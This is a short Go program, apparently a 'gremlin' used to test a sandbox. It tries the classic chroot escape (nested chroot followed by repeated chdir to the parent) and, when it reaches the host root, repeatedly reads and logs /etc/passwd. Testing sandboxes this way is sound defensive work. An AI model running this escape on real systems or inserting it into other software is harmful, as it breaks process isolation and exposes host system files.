package main

import (
	"log"
	"math/rand"
	"os"
	"regexp"
	"syscall"
	"time"
)

const (
	gremlinRootIndicatorFile = "GREMLIN_ROOT"
	pwdFile                  = "etc/passwd"
)

func tryHostRoot() bool {
	if err := os.Mkdir("chroot", 0755); err != nil {
		if !os.IsExist(err) {
			panic(err)
		}
	}
	syscall.Chroot("./chroot")

	for range 1000 {
		_ = os.Chdir("..")
	}
	syscall.Chroot(".")

	if _, err := os.Stat("/" + gremlinRootIndicatorFile); err == nil {
		// Unable to escape process root, give up
		log.Println("dAnG iT! cAn'T eScApE!!")
		return false
	}
	if _, err := os.Stat(hostRootIndicatorFile); err == nil {
		return true
	}
	return false
}

func bypassChroot(continueIfFed chan struct{}) {
	<-time.After(time.Duration(rand.Intn(4)+2) * time.Second)

	if !tryHostRoot() {
		return
	}

	re := regexp.MustCompile("^|\n")

	for range continueIfFed {
		pwd, err := os.ReadFile(pwdFile)
		if err != nil {
			panic(err)
		}

		pwdString := re.ReplaceAllString(string(pwd), "\n\t/etc/passwd:\t")

		log.Println("LoOk At WhAt I'vE fOuNd!")
		log.Println(pwdString)
	}
}
